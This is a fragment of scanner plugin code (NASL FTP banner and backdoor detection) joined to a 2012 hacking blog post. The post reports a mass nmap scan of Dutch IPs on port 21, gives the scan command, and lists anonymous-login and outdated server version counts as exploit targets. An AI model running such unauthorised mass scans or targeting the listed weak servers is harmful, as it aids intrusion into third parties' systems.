set_kb_item( name:\"ftp/omni-nfs/xlink/detected\", value:TRUE );\n
guess += '\\n- Omni-NFS XLINK';\n
}\n\n
if( \"httpdx\" >< banner ) {\n
set_kb_item( name:\"ftp/httpdx/detected\", value:TRUE );\n
set_kb_item( name:\"www_or_ftp/httpdx/detected\", value:TRUE );\n
guess += '\\n- httpdx';\n
}\n\n
if( \"vsftpd\" >< bannerlo ) {\n
set_kb_item( name:\"ftp/vsftpd/detected\", value:TRUE );\n
guess += '\\n- vsFTPd';\n
}\n\n
if( \"tnftpd\" >< banner ) {\n
set_kb_item( name:\"ftp/tnftpd/detected\", value:TRUE );\n
guess += '\\n- tnftpd';\n
}\n\n
if( \"Buffy\" >< banner ) {\n
set_kb_item( name:\"ftp/buffy/detected\", value:TRUE );\n
guess += '\\n- Buffy';\n
}\n\n
if( \"Data ONTAP\" >< banner ) {\n
set_kb_item( name:\"ftp/netapp/data_ontap/detected\", value:TRUE );\n
guess += '\\n- NetApp Data ONTAP';\n
}\n\n
report = 'Remote FTP server banner:\\n\\n' + banner;\n
if( strlen( guess ) > 0 )\n
report += '\\n\\nThis is probably:\\n' + guess;\n\n
if( syst && egrep( pattern:\"^215 .+\", string:syst ) )\n
report += '\\n\\nServer operating system information collected via \"SYST\" command:\\n\\n' + syst;\n\n
if( stat && egrep( pattern:\"^211 .+\", string:stat ) )\n
report += '\\n\\nServer status information collected via \"STAT\" command:\\n\\n' + stat;\n\n
log_message( port:port, data:report );\n}\n\nexit( 0 );\n", "cvss": {"score": 0.0, "vector": "NONE"}}], "nessus": [{"lastseen": "2019-02-21T01:10:56", "bulletinFamily": "scanner", "description": "The remote server advertises itself as being an FTP server, but it accepts commands sent out of order, which indicates that it may be a backdoor or a proxy. \n\nFurther FTP tests on this port will be disabled to avoid false alerts.", "modified": "2018-08-28T00:00:00", "id": "FTPD_BAD_SEQUENCE.NASL", "href": "https://www.tenable.com/plugins/index.php?view=single&id=32375", "published": "2008-05-19T00:00:00", "title": "FTP Server Bad Command Sequence Accepted (possible backdoor/proxy)", "type": "nessus", "sourceData": "#\n# (C) Tenable Network Security, Inc.\n#\n\n\ninclude(\"compat.inc\");\n\nif(description)\n{\n script_id(32375);\n script_version (\"1.12\");\n script_name(english:\"FTP Server Bad Command Sequence Accepted (possible backdoor/proxy)\");\n script_set_attribute(attribute:\"synopsis\", value:\n\"The remote FTP service accepts commands in any order.\" );\n script_set_attribute(attribute:\"description\", value:\n\"The remote server advertises itself as being an FTP server, but it\naccepts commands sent out of order, which indicates that it may be a\nbackdoor or a proxy. \n\nFurther FTP tests on this port will be disabled to avoid false alerts.\" );\n script_set_attribute(attribute:\"risk_factor\", value:\"None\" );\n script_set_attribute(attribute:\"solution\", value:\"n/a\" );\n script_set_attribute(attribute:\"plugin_publication_date\", value: \"2008/05/19\");\n script_cvs_date(\"Date: 2018/08/28 16:07:20\");\nscript_set_attribute(attribute:\"plugin_type\", value:\"remote\");\nscript_end_attributes();\n\n script_summary(english: \"Checks that the FTP server rejects commands in wrong order\");\n script_category(ACT_GATHER_INFO);\n script_family(english: \"FTP\");\n script_copyright(english: \"This script is Copyright (C) 2008-2018 and is owned by Tenable, Inc. or an Affiliate thereof.\");\n\n script_dependencies(\"find_service_3digits.nasl\", \"doublecheck_std_services.nasl\", \"logins.nasl\", \"ftpd_no_cmd.nasl\");\n script_require_ports(\"Services/ftp\", 21);\n script_exclude_keys(\"global_settings/supplied_logins_only\");\n script_require_keys(\"Settings/ExperimentalScripts\");\n exit(0);\n}\n\n#\ninclude(\"audit.inc\");\ninclude('global_settings.inc');\ninclude('misc_func.inc');\ninclude('ftp_func.inc');\n\nglobal_var port = 0;\n\nfunction test(soc)\n{\n local_var r, r2, score;\n score = 0;\n ftp_debug(str:\"custom banner\");\n r = ftp_recv_line(socket: soc, retry: 2);\n if (! r)\n {\n
debug_print('No FTP welcome banner on port ', port, '\\n');\n## set_kb_item(name: 'ftp/'+port+'/broken', value: TRUE);\n
set_kb_item(name: 'ftp/'+port+'/no_banner', value: TRUE);\n
return NULL;\n }\n debug_print(level: 2, 'Banner = ', r);\n\n if (r =~ '^[45][0-9][0-9] ' || \n
match(string: r, pattern: 'Access denied*', icase: 1))\n {\n
debug_print('FTP server on port ', port, ' is closed\\n');\n
set_kb_item(name: 'ftp/'+port+'/denied', value: TRUE);\n
return NULL;\n
}\n\n send(socket: soc, data: 'PASS '+rand_str()+'\\r\\n');\n r = ftp_recv_line(socket: soc, retry: 2);\n if (r =~ '^230[ -]') # USER logged in\n {\n
debug_print('PASS accepted without USER\\n');\n
set_kb_item(name: 'ftp/'+port+'/broken', value: TRUE);\n
score ++;\n }\n\n send(socket: soc, data: 'USER '+rand_str()+'\\r\\n');\n r = ftp_recv_line(socket: soc, retry: 2);\n if (r !~ '^331[ -]') return score;\n\n send(socket: soc, data: 'QUIT\\r\\n');\n r = ftp_recv_line(socket: soc, retry: 2);\n if (! r) return score;\n send(socket: soc, data: 'QUIT\\r\\n');\n r2 = ftp_recv_line(socket: soc, retry: 2);\n if (r =~ '^221[ -]' && r2 =~ '^221[ -]')\n {\n
debug_print('QUIT accepted twice\\n');\n
score ++;\n }\n return score;\n}\n\nif (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);\n\nif (! experimental_scripts)\n exit(0, 'This script only runs in experimental mode\\n');\n\nport = get_ftp_port(default: 21);\n\nsoc = open_sock_tcp(port);\nif (! soc) exit(1, 'TCP connection failed to port '+port+'.');\n\nscore = test(soc: soc);\n\nif (report_paranoia >= 2 && score >= 1 || score >= 2)\n{\n security_note(port);\n set_kb_item(name: 'ftp/'+port+'/broken', value: TRUE);\n}\n\nftp_close(socket: soc);\n", "cvss": {"score": 0.0, "vector": "NONE"}}, {"lastseen": "2019-02-21T01:07:38", "bulletinFamily": "scanner", "description": "It is possible to obtain the banner of the remote FTP server by connecting to a remote port.", "modified": "2018-10-02T00:00:00", "id": "FTPSERVER_DETECT_TYPE_ND_VERSION.NASL", "href": "https://www.tenable.com/plugins/index.php?view=single&id=10092", "published": "1999-10-12T00:00:00", "title": "FTP Server Detection", "type": "nessus", "sourceData": "#\n# (C) Tenable Network Security, Inc.\n#\n\ninclude(\"compat.inc\");\n\nif (description)\n{\n script_id(10092);\n script_version(\"1.55\");\n script_cvs_date(\"Date: 2018/10/02 13:39:47\");\n\n script_name(english:\"FTP Server Detection\");\n script_summary(english:\"Checks for FTP services.\");\n\n script_set_attribute(attribute:\"synopsis\", value:\n\"An FTP server is listening on a remote port.\");\n script_set_attribute(attribute:\"description\", value:\n\"It is possible to obtain the banner of the remote FTP server by\nconnecting to a remote port.\");\n script_set_attribute(attribute:\"solution\", value:\"n/a\");\n script_set_attribute(attribute:\"risk_factor\", value:\"None\");\n\n script_set_attribute(attribute:\"plugin_publication_date\", value:\"1999/10/12\");\n\n script_set_attribute(attribute:\"plugin_type\", value:\"remote\");\n script_end_attributes();\n\n script_category(ACT_GATHER_INFO);\n script_family(english:\"Service detection\");\n\n script_copyright(english:\"This script is Copyright (C) 2005-2018 and is owned by Tenable, Inc. or an Affiliate thereof.\");\n\n script_require_ports(\"Services/ftp\", 21);\n script_dependencies(\n
\"find_service_3digits.nasl\",\n
\"doublecheck_std_services.nasl\",\n
\"ftpd_no_cmd.nasl\",\n
\"ftpd_any_cmd.nasl\",\n
\"ftpd_bad_sequence.nasl\",\n
\"fake_3digits.nasl\",\n
\"ftp_kibuv_worm.nasl\"\n );\n\n exit(0);\n}\n\n#\n# The script code starts here\n#\ninclude(\"audit.inc\");\ninclude(\"global_settings.inc\");\ninclude(\"misc_func.inc\");\ninclude(\"ftp_func.inc\");\n\nglobal_var
port;\n\nfunction set_ftp_type()\n{\n
local_var type;\n
type = _FCT_ANON_ARGS[0];\n
set_kb_item(name: 'ftp/'+type, value:TRUE);\n
set_kb_item(name: 'ftp/'+port+'/'+type, value:TRUE);\n}\n\n# Check broken/backdoored in case we get a valid banner\n# If no valid banner this will audit out afterwards anyways\nports = get_ftp_ports(default:21, broken:TRUE);\nif(isnull(ports))\n
exit(0, \"No FTP ports found.\");\n\nport = branch(ports);\n\nbanner = get_ftp_banner(port: port);\nif (! banner) audit(AUDIT_NO_BANNER, port);\n\nif(\n
\"421 Service not available\" >!< banner &&\n
\"421 Too many connections\" >!< banner &&\n
\"530 Connection refused\" >!< banner\n)\n{\n if (\"Core FTP Server\" >< banner) set_ftp_type(\"coreftpserver\");\n if (\"NcFTPd\" >< banner)\n
set_ftp_type(\"ncftpd\");\n if (\" ProFTPD \" >< banner || \"-ProFTPD \" >< banner || \"(ProFTPD\" >< banner)\n
set_ftp_type(\"proftpd\");\n if(\"icrosoft FTP\" >< banner)\n
set_ftp_type(\"msftpd\");\n if(\"heck Point Firewall-1 Secure FTP\" >< banner)\n
set_ftp_type(\"fw1ftpd\");\n if ( \"Serv-U FTP Server\" >< banner ||\n
# nb: this seems to be for versions < 3.x.\n
\"Serv-U FTP-Server\" >< banner )\n
set_ftp_type(\"servu\");\n if(\"Version wu-\" >< banner || \"Version wuftpd-\" >< banner)\n
set_ftp_type(\"wuftpd\");\n if(\"xWorks\" >< banner) set_ftp_type(\"vxftpd\");\n if (\"WS_FTP Server\" >< banner) set_ftp_type(\"wsftp\");\n if (\"TurboFTP Server\" >< banner) set_ftp_type(\"turboftp\");\n if (\"TYPSoft FTP\" >< banner) set_ftp_type(\"typsoftftp\");\n if (\"Wing FTP Server\" >< banner) set_ftp_type(\"wingftp\");\n if (\"FileZilla Server\" >< banner) set_ftp_type(\"filezilla\");\n if (\"vsFTPd\" >< banner) set_ftp_type(\"vsftpd\");\n if (\"ProRat\" >< banner) set_ftp_type(\"prorat\");\n if (\"AXIS\" >< banner || \"Axis\" >< banner) set_ftp_type(\"axis\");\n if (\"ProFTPD\" >< banner && \"500 GET not understood\" >< banner)\n
banner = banner - strstr(banner, \"500 GET not understood\");\n\n report = '\\nThe remote FTP banner is :\\n\\n' + banner;\n security_note(port:port, extra:report);\n}\n", "cvss": {"score": 0.0, "vector": "NONE"}}]}FTP scan -STATS- | Neusbeer's hideout
Neusbeer's hideout
everything what's going (wr)on(g) in my head…
Search
Main menu
Skip to primary content
Home
Post navigation
← Previous
Next →
FTP scan -STATS-
Posted on February 6, 2012
by
neusbeer
FTP scan -STATS-
For those who is interested in my stats and findings after a nice big scan of FTP port 21
I scanned in groups of 50.000 Dutch IPs with NMap.
I used -T5 to speed up the things so he can missed some
ftp servers with slow response.
scan command/the script I used
#!/bin/bash
# $1 : infile (without .txt) output is infile + _p21.gnmap/nmap/xml
sudo nmap -v -r -iL “$1”.txt -Pn -T5 -sV –version-all -n -p 21 -oA ~/workingdir/output/p21/”$1″_p21 –script=ftp-anon,banner,ftp-proftpd-backdoor,ftp-vsftpd-backdoor –open -sS
Ofcourse you can use your own script for this. But this one suited me best at the moment.
I scanned for this 105 ip lists of 5000 gives me a total of 5.250.000 IP’s
Not 1 time I got a hit from the 2 scripts of nmap which checks for a backdoored FTP version
so
num ip’s : 5.250.000 (list)
uniq IP’s w/o port 21 : 41.412 (list)
Top 5 ip groups (list)
6963     145.216
3442     145.217
1642       83.162
1194     212.204
996        86.109
backdoored : 0
Found Service Info : 142 *not much(-T5 is fastscan with not enough waiting time)
Top 5
85 Service Info: OS: Unix
27 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
4 Service Info: Device: firewall
3 Service Info: Device: broadband router
2 Service Info: OS: VxWorks; CPE: cpe:/o:windriver:vxworks
FTP anonymous access : 1765* succesfully logins with user:anonymous pass:anon@
also the scan did a banner grab (short one because of the T5 option of NMap and a lot of banners aren’t grabbed because of the scriptwaiting time)
Banner grabbed : 20457 (almost 50% of the open ports found)
Return codes top 3
20190 220
62 530
46 550
ProFTPD : 5308 (1/4 of all the banners)
Top 5 versions
621 ProFTPD 1.3.1 Server
368 ProFTPD 1.3.3c Server
355 ProFTPD 1.3.2e Server
240 ProFTPD 1.3.3e Server
141 ProFTPD 1.3.3a Server
vsFTPD : 1653
Top 5 versions
907 (vsFTPd 2.0.5)
205 (vsFTPd 2.0.7)
122 (vsFTPd 2.3.2)
119 (vsFTPd 2.2.2)
68 (vsFTPd 2.0.1)
FileZilla : 710
Top 5 versions
168 FileZilla Server version 0.9.37 beta
142 FileZilla Server version 0.9.39 beta
83 FileZilla Server version 0.9.40 beta
72 FileZilla Server version 0.9.34 beta
41 FileZilla Server version 0.9.33 beta
VxWorks : 99
Top 5 versions
69 VxWorks (VxWorks5.4.2) FTP server ready
17 Tornado-vxWorks (VxWorks5.4.2) FTP server ready
9 VxWorks (5.4.2) FTP server ready
2 VxWorks (VxWorks5.5.1) FTP server ready
1 VxWorks FTP server (VxWorks 5.4.2) ready.
NASFTP : 359
Turbo : 350
277 Turbo station 2.x 1.3.2e Server
73 Turbo station 2.x 1.3.1rc2 Server
3.x Server : 9
Serv-U : 139
Top 5 versions
29   v6.4
16   v6.0
14   v11.1
11   v6.2
8   v6.3
FTP Server ready. : 2469
some other statics
NAS found : 615
Microsoft FTP Service : 1805
FritzBox : 86
‘welcome’ in banner : 3116
‘ready’ in banner :8792
service not available : 33
Cisco : 23
P2612HW : 62 *ZyXEL Router
camera’s : 47 *39 AXIS
DreamBox : 197
Moxa FTP : 13
DSL Router : 30
DiskStation : 255
Check Point Firewall : 119
TCAdmin : 40
Winsock ready… : 93
Gene6 : 54
spftp : 38
ucftpd : 20
FTP-Uploadserver : 61
WAR-FTPD : 7
BulletProof FTP : 27
Titan FTP : 14
zFTPServer : 20
Cerberus : 22
Rumpus : 37
JD FTP : 33
Card AOS : 68
pd-admin : 6
Welcome to the CS network : 25 ? so many
Netwerkschijf : 7 *dutch for “disk drive”
Inactivity timer text : 72
Connection refused,
unknown IP address : 59
IP in banner : 3859
Why I make stats?
can be handy with pentesting!
For example knowning that the word ‘welcome’ isn’t often used (+/- 25%)
and ‘ready’ not reaching 50% that a scanner based on return strings
isn’t the best idea.
Or if you see the versions of the mainly used ftp servers don’t have the latest
version. 1.3.1. for ProFTPD and 2.0.5 for vsFTPd. and googling around brings
a lot of exploits based on this versions.
Serv-U 6.4 is most used, and a lot of exploits are on the net.
(Dir traversal, BoF’s, Auth. bypass).
oh.. the total scan time was just over 120 hours. 😀
I have the datafiles for sharing if you want them
(ip list, scan results, etc. contact me if you want them for your own research).
This entry was posted in Hacking, Portscanning by neusbeer. Bookmark the permalink.
One thought on “FTP scan -STATS-”
Vikram on December 10, 2012 at 8:37 am said:
Nice one bro 120 hours is too much of time
I would be really happy if you share some data not all of course i need it for pentesting.
I am still learning pentesting so live examples may be great to exploit them.
Reply ↓
Leave a Reply Cancel reply
Your email address will not be published. Required fields are marked *Comment Name *
Email *
Website
packetstormsecurity.orgUbuntu Security Notice USN-4040-1Ubuntu Security Notice USN-4040-2Red Hat Security Advisory 2019-1591-01GNUnet P2P Framework 0.11.5Coldfusion / JNBridge Remote Code ExecutionUbuntu Security Notice USN-4038-2Ubuntu Security Notice USN-4038-1AMD Secure Encrypted Virtualization (SEV) Key RecoveryD-Link Administrative Password DisclosureWebEx Man-In-The-Middle
security.nlNederland en Duitsland gaan militair internet bouwenOrigin-accounts waren via subdomein van EA Games te kapen"Zeven woorden en ik was in deze phishingaanval getrapt"Onderzoekers spoofen Amerikaans waarschuwingssysteemMozilla maakt online tracking zichtbaar via nieuw projectFrans vertaalbureau krijgt AVG-boete voor filmen van personeelAmerikaanse stad betaalt ransomware 490.000 dollar losgeldNieuwe malware schakelt slecht beveiligde IoT-apparaten uitJuridische vraag: Mag een werkgever ongevraagd en zonder inspraak mails versturen uit naam van de werknemer?Microsoft voorziet OneDrive van "persoonlijke datakluis"
1337day
Proudly powered by WordPress